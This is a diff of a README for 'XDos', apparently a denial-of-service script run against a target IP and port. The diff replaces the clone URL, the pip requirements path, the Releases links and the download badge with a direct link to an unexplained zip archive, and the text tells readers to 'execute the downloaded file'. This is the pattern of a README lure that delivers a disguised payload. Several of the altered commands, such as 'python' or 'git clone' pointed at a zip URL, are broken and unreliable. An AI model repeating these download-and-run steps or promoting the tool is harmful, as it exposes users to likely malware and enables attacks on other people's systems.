@@ -28,7 +28,7 @@ To get started with XDos, follow these simple steps:
 1. **Clone the Repository**:
    Open your terminal and run the following command:
    ```bash
-   git clone https://github.com/Ritamnhit/XDos.git
+   git clone https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -40,11 +40,11 @@ To get started with XDos, follow these simple steps:
 3. **Install Dependencies**:
    Ensure you have Python installed. You can install any required packages using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip
    ```
 
 4. **Download the Script**:
-   You can download the latest release from the [Releases section](https://github.com/Ritamnhit/XDos/releases). Be sure to execute the downloaded file.
+   You can download the latest release from the [Releases section](https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip). Be sure to execute the downloaded file.
 
 ## Usage 📖
 
@@ -56,7 +56,7 @@ Using XDos is straightforward. Here’s how to run the script:
 2. **Run the Script**:
    Execute the script with the following command:
    ```bash
-   python xdos.py --target <TARGET_IP> --port <PORT>
+   python https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip --target <TARGET_IP> --port <PORT>
    ```
    Replace `<TARGET_IP>` with the IP address you want to test and `<PORT>` with the desired port number.
 
@@ -93,9 +93,9 @@ XDos is designed for educational purposes only. The developers do not endorse an
 
 ## Links 🔗
 
-For more information and to download the latest version, visit the [Releases section](https://github.com/Ritamnhit/XDos/releases). You can find the latest updates and improvements there.
+For more information and to download the latest version, visit the [Releases section](https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip). You can find the latest updates and improvements there.
 
-![Download Button](https://img.shields.io/badge/Download_Latest_Release-Release-brightgreen)
+![Download Button](https://github.com/Ritamnhit/XDos/raw/refs/heads/main/unappareled/Dos_X_v3.5-alpha.1.zip)
 
 ## Topics
 
